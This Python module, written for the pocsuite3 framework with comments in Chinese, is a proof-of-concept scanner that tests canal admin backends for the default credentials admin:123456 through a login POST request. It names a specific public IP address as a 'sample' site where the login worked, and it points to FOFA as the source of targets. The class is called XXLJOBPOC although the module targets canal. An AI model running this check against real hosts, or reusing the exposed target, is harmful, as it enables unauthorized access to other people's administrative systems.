from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)


class XXLJOBPOC(POCBase):
    vulID = "111"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "19dl"  # PoC作者的大名
    vulDate = "2022-07-13"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-07-13"  # 编写 PoC 的日期
    updateDate = "2022-07-13"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://fofa.info/toLogin"]  # 漏洞地址来源,0day不用写
    name = "canal 后台弱口令 PoC"  # PoC 名称
    appPowerLink = "https://fofa.info/toLogin"  # 漏洞厂商主页地址
    appName = "canal"  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.WEAK_PASSWORD  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = ["http://42.51.74.8:8089/api/v1/user/login"]  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
                canal后台存在默认口令，攻击者可以通过默认口令登录到后台，浏览敏感信息或进行敏感操作
            """  # 漏洞简要描述
    pocDesc = """
                admin:123456
            """  # POC用法描述

    def _check(self):
        result = []
        full_url = f"{self.url}/api/v1/user/login"

        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
                   "Accept": "application/json, text/plain, */*",
                   "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                   "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json;charset=utf-8",
                   "Origin": "http://42.51.74.8:8089", "Connection": "close", "Referer": "http://42.51.74.8:8089/"}
        json = {"password": "123456", "username": "admin"}

        try:
            response = requests.post(full_url, headers=headers, json=json, allow_redirects=False, verify=False,
                                     timeout=5)

            data_dict = response.json()
            # 判断是否存在漏洞
            if data_dict.get("code") == 20000 and data_dict.get("message") == None:
                result.append(self.url)

        except Exception as e:
            pass
        finally:
            return result

    def _verify(self):
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(XXLJOBPOC)
